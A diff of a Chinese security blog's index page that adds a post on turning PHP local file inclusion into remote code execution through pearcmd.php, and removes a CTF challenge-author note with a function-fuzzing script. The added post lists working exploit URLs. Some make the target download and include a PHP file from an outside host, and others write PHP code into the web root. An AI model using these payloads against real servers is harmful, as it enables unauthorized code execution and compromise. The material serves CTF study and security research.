@@ -71,6 +71,98 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-LFI利用php自带的pearcmd.php直接RCE" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/10/19/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" class="article-date">
+  <time class="dt-published" datetime="2020-10-19T16:00:00.000Z" itemprop="datePublished">2020-10-20</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/10/19/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/">LFI利用php自带的pearcmd.php直接RCE</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="LFI利用php自带的pearcmd-php直接RCE"><a href="#LFI利用php自带的pearcmd-php直接RCE" class="headerlink" title="LFI利用php自带的pearcmd.php直接RCE"></a>LFI利用php自带的pearcmd.php直接RCE</h1><p>在做巅峰极客的一题时，用到了包含pearcmd.php从而RCE的点（perlcmd.php也是一样的），今天来研究一下这个点</p>
+<h2 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h2><p>阅读pearcmd.php中关于参数产生的那部分代码发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>]) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$argv</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$HTTP_SERVER_VARS</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;ERROR: either use the CLI php executable, &#x27;</span> .</span><br><span class="line">         <span class="string">&#x27;or set register_argc_argv=On in php.ini&#x27;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$argv</span> = Console_Getopt::readPHPArgv();</span><br><span class="line">...</span><br><span class="line">array_shift(<span class="variable">$argv</span>);<span class="comment">//这里删除了第一个argv，通常argv[0]是程序名</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+
+
+<p><code>Getopt.php:readPHPArgv</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">readPHPArgv</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$argv</span>;</span><br><span class="line">    <span class="keyword">if</span> (!is_array(<span class="variable">$argv</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!@is_array(<span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!@is_array(<span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$msg</span> = <span class="string">&quot;Could not read cmd args (register_argc_argv=Off?)&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> PEAR::raiseError(<span class="string">&quot;Console_Getopt: &quot;</span> . <span class="variable">$msg</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$GLOBALS</span>[<span class="string">&#x27;HTTP_SERVER_VARS&#x27;</span>][<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;argv&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$argv</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>我们发现这里的参数是从<code>$_SERVER[&#39;argv&#39;]</code>（旧版本的就是：<code>$GLOBALS[&#39;HTTP_SERVER_VARS&#39;][&#39;argv&#39;]</code>）中获取的</p>
+<p>我们来测试一下<code>$_SERVER[&#39;arvg&#39;]</code>,测试代码：<code>var_dump($_SERVER[&#39;argv&#39;]);</code></p>
+<p>访问<a target="_blank" rel="noopener" href="http://127.0.0.1:60080/?1+2+3+4+%20+%EF%BF%BD">http://127.0.0.1:60080/?1+2+3+4+%20+%dd</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/var/www/html/index.php:4:</span><br><span class="line">array (size=6)</span><br><span class="line">  0 =&gt; string &#x27;1&#x27; (length=1)</span><br><span class="line">  1 =&gt; string &#x27;2&#x27; (length=1)</span><br><span class="line">  2 =&gt; string &#x27;3&#x27; (length=1)</span><br><span class="line">  3 =&gt; string &#x27;4&#x27; (length=1)</span><br><span class="line">  4 =&gt; string &#x27;%20&#x27; (length=3)</span><br><span class="line">  5 =&gt; string &#x27;%dd&#x27; (length=3)</span><br></pre></td></tr></table></figure>
+
+<p>在$_SERVER[‘argv’]中的所有url编码都不会被解析，只是当成普通字符串，而+会被解析成参数的分隔符</p>
+<p>于是我们便可以像在命令行一样调用pearcmd.php了，接下来就变成了利用pearcmd这个命令getshell，直接命令行尝试（太懒了）</p>
+<p>查看pearcmd.php的帮助：<code>php pearcmd.php [options] command [command-options] &lt;parameters&gt;</code>，那么我们传参就得变成</p>
+<p><code>url/?+[options]+command+[command-options]+&lt;parameters&gt;</code>，?后面必须跟一个+号让其作为$argv[0],这里要注意+号的数量，因为这是拿来作为分隔符的如：<code>?++</code>就会被解析成<code>[&quot;&quot;,&quot;&quot;,&quot;&quot;]</code></p>
+<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20201020153757.png" alt="image1911"></p>
+<ol>
+<li>register_argc_argv=On（默认是开的）</li>
+<li>包含pearcmd.php或者peclcmd.php</li>
+</ol>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>这里直接给出payload，都是直接看帮助写出来的，没啥好说的。</p>
+<p>exp1:</p>
+<p>需要出网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.230:60080/?+install+--installroot+/tmp/+http://ccreater.top:60006/evil.php++++++++++++++$&amp;f=pearcmd.php&amp;#把GET参数都塞到最后面</span><br><span class="line">http://192.168.43.230:60080/?f=/tmp/tmp/pear/download/install.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp2:</p>
+<p>需要出网</p>
+<p>会下载到当前文件夹</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.230:60080/?+download+https://fuckyou.free.beeceptor.com/fuckyou.php+&amp;f=pearcmd.php#都塞到最后面</span><br><span class="line">http://192.168.43.230:60080/?f=fuckyou.php</span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp3:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.43.230:60080/?+config-create+/<span class="meta">&lt;?=</span>phpinfo();<span class="meta">?&gt;</span>/*+/var/www/html/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php#把GET参数都塞到路径中，这里可以用url编码来防止空格,/等对文件生成造成影响的字符</span></span><br><span class="line">http:<span class="comment">//192.168.43.230:60080/&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM.php</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>exp4:</p>
+<p><strong>最好用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.230:60080/?+-c+/var/www/html/config2.php+-d+man_dir=&lt;?phpinfo();?&gt;/*+-s+list&amp;f=pearcmd.php&amp;XDEBUG_SESSION_START=PHPSTORM#参数塞到最后面</span><br><span class="line">http://192.168.43.230:60080/config2.php</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://site.ccreater.top/2020/10/19/LFI%E5%88%A9%E7%94%A8php%E8%87%AA%E5%B8%A6%E7%9A%84pearcmd.php%E7%9B%B4%E6%8E%A5RCE/" data-id="ckubfvk2a001udcn88bhpgowf" data-title="LFI利用php自带的pearcmd.php直接RCE" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-巅峰极客2020wp" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" class="article-date">
@@ -156,7 +248,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" data-id="cku8ky2zq007gdnnf5fhr0i2m" data-title="巅峰极客2020wp" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/10/19/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22020wp/" data-id="ckubfvk49007jdcn8hjyq9k6a" data-title="巅峰极客2020wp" class="article-share-link">Share</a>
       
       
       
@@ -235,7 +327,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/10/14/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-id="cku8ky2ws000rdnnfhev4b76u" data-title="2020西湖论剑" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/10/14/2020%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91/" data-id="ckubfvk1w000rdcn8bb8wc70h" data-title="2020西湖论剑" class="article-share-link">Share</a>
       
       
       
@@ -348,7 +440,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/10/14/Service%20Worker/" data-id="cku8ky2xf0022dnnfa26ydchi" data-title="Service Worker" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/10/14/Service%20Worker/" data-id="ckubfvk2h0022dcn87swsfqz0" data-title="Service Worker" class="article-share-link">Share</a>
       
       
       
@@ -424,7 +516,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/10/04/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" data-id="cku8ky2x7001pdnnf09e065a2" data-title="FastJson1.2.24调试记录_复现" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/10/04/FastJson1.2.24%E8%B0%83%E8%AF%95%E8%AE%B0%E5%BD%95_%E5%A4%8D%E7%8E%B0/" data-id="ckubfvk29001pdcn84lsn09o9" data-title="FastJson1.2.24调试记录_复现" class="article-share-link">Share</a>
       
       
       
@@ -571,7 +663,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/10/03/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" data-id="cku8ky2w50004dnnf15eydkcg" data-title="2020 ciscn 华东南 web" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/10/03/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/" data-id="ckubfvk1k0004dcn87als705w" data-title="2020 ciscn 华东南 web" class="article-share-link">Share</a>
       
       
       
@@ -669,7 +761,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/10/03/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" data-id="cku8ky2yo004sdnnf3ptf0dyg" data-title="jdk7u21反序列化复现" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/10/03/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/" data-id="ckubfvk3e004wdcn82h2e9beu" data-title="jdk7u21反序列化复现" class="article-share-link">Share</a>
       
       
       
@@ -743,7 +835,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/09/20/2020-QWB-final-bjyadmin/" data-id="cku8ky2w60005dnnf1om766uo" data-title="2020-QWB-final-bjyadmin" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/09/20/2020-QWB-final-bjyadmin/" data-id="ckubfvk1l0005dcn81jg5aqli" data-title="2020-QWB-final-bjyadmin" class="article-share-link">Share</a>
       
       
       
@@ -834,7 +926,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/09/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/" data-id="cku8ky2zy0081dnnf2r74bqlt" data-title="羊城杯2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/09/13/%E7%BE%8A%E5%9F%8E%E6%9D%AF2020/" data-id="ckubfvk4f0084dcn840rbacyr" data-title="羊城杯2020" class="article-share-link">Share</a>
       
       
       
@@ -955,74 +1047,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/09/06/DDCTF2020/" data-id="cku8ky2x3001hdnnf7amv7snd" data-title="DDCTF2020" class="article-share-link">Share</a>
+      <a data-url="https://site.ccreater.top/2020/09/06/DDCTF2020/" data-id="ckubfvk25001hdcn82py33r5w" data-title="DDCTF2020" class="article-share-link">Share</a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf-wp/" rel="tag">ctf,wp</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-ciscn2020easyphp出题笔记" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/08/20/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" class="article-date">
-  <time class="dt-published" datetime="2020-08-20T16:00:00.000Z" itemprop="datePublished">2020-08-21</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E6%9D%82/">杂</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/08/20/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">ciscn2020easyphp出题笔记</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="easyphp出题笔记"><a href="#easyphp出题笔记" class="headerlink" title="easyphp出题笔记"></a>easyphp出题笔记</h1><p>这题原意是想让大家写脚本来fuzz来发现CUFA/CUF中对引用处理不恰当而造成的崩溃，特意禁止了pcntl可是由于没有认真测试，忘记了还有CUF这个函数，结果有人直接绕过了。</p>
-<p>出题人想干的事情就是我们不让他干成就是对这种情况的最好解释。最后看到自己的题目被解成那样，我也是自闭了。</p>
-<p>继续正题吧。</p>
-<h2 id="来由"><a href="#来由" class="headerlink" title="来由"></a>来由</h2><p>之所以会出现这题是因为前段时间的wmctf的webweb反序列化出有这样一处的利用点，我为了找到合适的函数就采取fuzz，东西没发现倒是发现php崩溃了。</p>
-<h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>直接去看<a target="_blank" rel="noopener" href="https://bugs.php.net/bug.php?id=79979">bugs.php</a> 上面的，会不会是因为交到bugs.php上的原因导致这么多人解了？</p>
-<h2 id="原解"><a href="#原解" class="headerlink" title="原解"></a>原解</h2><p>阅读代码我们发现:<code>if(!pcntl_wifexited($status))&#123;phpinfo();&#125;</code>，及fork的子进程报错就会执行phpinfo，而phpinfo里面通常包含敏感信息，和一些对我们题目有帮助的信息。</p>
-<p>fork子进程执行的代码是：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;is_string(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])&amp;&amp;!preg_match(<span class="string">&quot;/[:\\\\]|exec|pcntl/i&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]))&#123;</span><br><span class="line">            call_user_func_array(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>],[<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>],<span class="literal">false</span>,<span class="literal">true</span>]);</span><br></pre></td></tr></table></figure>
-
-<p>而这里调用了非常敏感的call_user_func_array，所以无论是想让子进程报错还是直接执行代码这里都是非常好的选择。因此我们先要写个fuzz脚本：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$payloads</span>=[</span><br><span class="line">        <span class="string">&quot;ls&quot;</span>,<span class="comment">//shell命令执行测试</span></span><br><span class="line">        <span class="string">&quot;index.php&quot;</span>,<span class="comment">//读取文件测试</span></span><br><span class="line">        <span class="string">&quot;asdfasldfjaklsdfjl.php&quot;</span>,<span class="comment">//创建文件/文件夹测试</span></span><br><span class="line">        <span class="string">&quot;echo 123;&quot;</span><span class="comment">//php命令执行测试</span></span><br><span class="line">    ];</span><br><span class="line">    <span class="variable">$str</span>=file_get_contents(<span class="string">&quot;fatalerr.log&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable">$str</span>)&#123;</span><br><span class="line">        <span class="variable">$str</span>=<span class="string">&quot;[]&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$fatalerror</span>=<span class="keyword">eval</span>(<span class="string">&quot;return &quot;</span>.<span class="variable">$str</span>.<span class="string">&quot;;&quot;</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">show_result</span>(<span class="params"><span class="variable">$func</span>,<span class="variable">$r</span>,<span class="variable">$v</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$r</span>==<span class="literal">NULL</span>)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$func</span>(<span class="subst">$v</span>,false,true) return value:&quot;</span>;</span><br><span class="line">            var_dump(<span class="variable">$r</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">brute_func</span>(<span class="params"><span class="variable">$a</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$payloads</span>;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$fatalerror</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$val</span>)&#123;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(is_array(<span class="variable">$val</span>))&#123;</span><br><span class="line">                brute_func(<span class="variable">$val</span>);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span>(in_array(<span class="variable">$val</span>,<span class="variable">$fatalerror</span>))&#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            array_push(<span class="variable">$fatalerror</span>,<span class="variable">$val</span>);</span><br><span class="line">            file_put_contents(<span class="string">&quot;fatalerr.log&quot;</span>,var_export(<span class="variable">$fatalerror</span>,<span class="literal">TRUE</span>));</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$payloads</span> <span class="keyword">as</span> <span class="variable">$v</span>)&#123;</span><br><span class="line">                <span class="variable">$r</span>=<span class="literal">NULL</span>;</span><br><span class="line">                </span><br><span class="line">                <span class="variable">$r</span>=call_user_func_array(<span class="variable">$val</span>,[<span class="variable">$v</span>,<span class="literal">false</span>,<span class="literal">true</span>]);</span><br><span class="line">                show_result(<span class="variable">$val</span>,<span class="variable">$r</span>,<span class="variable">$v</span>);</span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            array_pop(<span class="variable">$fatalerror</span>);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="variable">$arr</span>=get_defined_functions();</span><br><span class="line">    brute_func(<span class="variable">$arr</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>多次执行发现：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stream_socket_server</span><br><span class="line">exec</span><br><span class="line">stream_socket_client</span><br></pre></td></tr></table></figure>
-
-<p>这三个函数会引起segment_fault 且 exec虽然会引起segment  fault但是仍然执行了代码，但是这里我禁用了exec所以我们用另外两个函数引起segment fault查看phpinfo，在phpinfo中找到flag。</p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>希望有师傅有不同的解可以留个言啥的谢谢啦</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://site.ccreater.top/2020/08/20/ciscn2020easyphp%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" data-id="cku8ky2y2003ldnnfgest5st8" data-title="ciscn2020easyphp出题笔记" class="article-share-link">Share</a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/" rel="tag">出题笔记</a></li></ul>
 
     </footer>
   </div>
@@ -1089,6 +1118,10 @@
       <ul>
         
           <li>
+            <a href="/2021/10/03/TSGCTF2021/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2021/10/01/%E7%94%A8github%20action%20%E8%AE%A9hexo%E4%BD%93%E9%AA%8C++/">用github action 让hexo体验++</a>
           </li>
         
@@ -1102,10 +1135,6 @@
         
           <li>
             <a href="/2020/12/15/2020xnuca_ezwp%E9%A2%98%E8%A7%A3/">2020xnuca_ezwp题解</a>
-          </li>
-        
-          <li>
-            <a href="/2020/11/26/2020%20balsn%20ctf%20web%20%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">2020 balsn ctf web 部分题解</a>
           </li>
         
       </ul>
